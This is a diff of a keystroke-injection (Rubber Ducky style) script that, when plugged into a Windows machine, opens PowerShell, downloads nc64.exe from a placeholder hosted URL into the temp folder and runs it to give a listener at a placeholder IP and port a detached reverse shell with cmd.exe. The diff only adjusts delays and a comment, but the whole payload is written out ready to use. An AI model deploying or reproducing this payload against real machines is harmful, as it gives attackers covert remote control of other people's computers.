@@ -5,27 +5,28 @@ REM <HOSTED URL> - URL to where nc64.exe is hosted
 REM <IP_ADDR> - Change the IP to your listener IP
 REM <PORT>  - Port of listener
 
-DEFAULTDELAY 100
+DEFAULTDELAY 150
 
 REM Open Powershell
 GUI r
-DELAY 100
 STRING powershell
 ENTER
 DELAY 1000
 
-REM Set path to remp 
+REM Set path to temp
 STRING $path = [System.IO.Path]::GetTempPath()
 SHIFT ENTER
 STRING Set-Location $path
 SHIFT ENTER
+
+
 REM Download nc64.exe
 STRING Invoke-Webrequest http://<HOSTED_URL>/nc64.exe -OutFile a.exe
 ENTER
+
 REM Connect to listener
 STRING ./a.exe <IP_ADDR> <PORT> -e cmd.exe -d
 ENTER
 
 REM Exit Powershell
 ALT F4
-
